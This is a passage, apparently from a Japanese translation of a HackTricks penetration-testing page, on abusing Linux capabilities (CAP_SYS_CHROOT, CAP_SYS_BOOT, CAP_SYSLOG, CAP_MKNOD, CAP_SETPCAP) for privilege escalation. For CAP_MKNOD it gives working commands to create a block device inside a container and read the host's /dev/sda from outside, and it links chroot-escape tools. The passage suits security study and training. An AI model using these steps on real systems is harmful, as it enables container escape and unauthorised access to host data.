fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
通常、この不変属性は以下を使用して設定および削除されます:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` システムコールの使用を許可します。これにより、既知の弱点や脱出手段を使用して、任意の `chroot(2)` 環境からの脱出が可能になる場合があります：

* [様々なchrootソリューションからの脱出方法](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot脱出ツール](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `reboot(2)` システムコールの使用を許可します。また、`LINUX_REBOOT_CMD_RESTART2` を介して任意の **リブートコマンド** を実行することもできます。これは特定のハードウェアプラットフォームで実装されています。

この機能はまた、新しいクラッシュカーネルをロードする `kexec_load(2)` システムコールの使用も許可し、Linux 3.17以降では署名されたカーネルもロードする `kexec_file_load(2)` も許可します。

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、Linux 2.6.37で `CAP_SYS_ADMIN` の包括的な機能から分岐しました。この機能はプロセスが `syslog(2)` システムコールを使用することを許可します。また、`/proc/sys/kernel/kptr_restrict` が1に設定されている場合、`/proc` や他のインターフェースを介して公開されるカーネルアドレスをプロセスが表示することも許可します。

`kptr_restrict` sysctl設定は2.6.38で導入され、カーネルアドレスが公開されるかどうかを決定します。これはバニラカーネル内で2.6.39以降、デフォルトでゼロ（カーネルアドレスを公開）に設定されていますが、多くのディストリビューションは正しく1（uid 0以外から隠す）または2（常に隠す）に設定しています。

さらに、この機能は `dmesg_restrict` 設定が1である場合、プロセスが `dmesg` 出力を表示することも許可します。最後に、歴史的な理由から、`CAP_SYS_ADMIN` 機能は依然として自身で `syslog` 操作を実行することが許可されています。

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常のファイル (`S_IFREG`)、FIFO（名前付きパイプ）(`S_IFIFO`)、またはUNIXドメインソケット (`S_IFSOCK`) 以外のものを作成することを許可することにより、[mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) の使用を拡張します。特別なファイルは以下の通りです：

* `S_IFCHR` (キャラクタースペシャルファイル（端末のようなデバイス）)
* `S_IFBLK` (ブロックスペシャルファイル（ディスクのようなデバイス）)。

これはデフォルトの機能です（[https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。

この機能は、以下の条件下でホスト上での権限昇格（フルディスク読み取りを通じて）を行うことを許可します：

1. ホストへの初期アクセスを持つ（非特権）。
2. コンテナへの初期アクセスを持つ（特権（EUID 0）および有効な `CAP_MKNOD`）。
3. ホストとコンテナは同じユーザーネームスペースを共有する必要があります。

**手順 :**

1. ホスト上で、標準ユーザーとして：
   1. 現在のUIDを取得します（`id`）。例：`uid=1000(unprivileged)`。
   2. 読み取りたいデバイスを取得します。例：`/dev/sda`
2. コンテナ内で、`root` として：
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. ホストに戻る：
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
攻撃者は、権限のないユーザーからデバイス `/dev/sda` を読み取り、ダンプし、コピーすることができます。

### CAP\_SETPCAP

**`CAP_SETPCAP`** は、プロセスが**他のプロセスの能力セットを変更する**ことを可能にするLinuxの能力です。他のプロセスの有効、継承可能、許可された能力セットに能力を追加または削除する権限を与えます。しかし、この能力を使用する際には一定の制限があります。

`CAP_SETPCAP` を持つプロセスは、**自身の許可された能力セットにある能力のみを付与または削除することができます**。つまり、プロセスは自身が持っていない能力を他のプロセスに付与することはできません。この制限により、プロセスが他のプロセスの権限を自身の権限レベルを超えて昇格させることを防ぎます。

さらに、最近のカーネルバージョンでは、`CAP_SETPCAP` 能力は**さらに制限されています**。プロセスが他のプロセスの能力セットを任意に変更することはもはや許されません。代わりに、**自身の許可された能力セットまたはその子孫の許可された能力セットの能力を低下させることのみを許可します**。この変更は、能力に関連する潜在的なセキュリティリスクを減らすために導入されました。

`CAP_SETPCAP` を効果的に使用するには、効果的な能力セットに能力を持ち、許可された能力セットに目標とする能力を持っている必要があります。その後、`capset()` システムコールを使用して他のプロセスの能力セットを変更することができます。

要約すると、`CAP_SETPCAP` はプロセスが他のプロセスの能力セットを変更することを可能にしますが、自身が持っていない能力を付与することはできません。さらに、セキュリティ上の懸念から、その機能は最近のカーネルバージョンで制限され、自身の許可された能力セットまたはその子孫の許可された能力セットの能力を減らすことのみを許可するようになっています。

## 参考文献

**これらの例のほとんどは** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **のいくつかのラボから取られていますので、このprivesc技術を練習したい場合は、これらのラボをお勧めします。**

**その他の参考文献**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**で最も重要なイベントの一つです。技術とサイバーセキュリティの専門家が集まるこの会議は、**技術知識の促進**を使命としています。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの** **会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見する、私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクション
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に **参加する** か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを **共有する**。

</details>
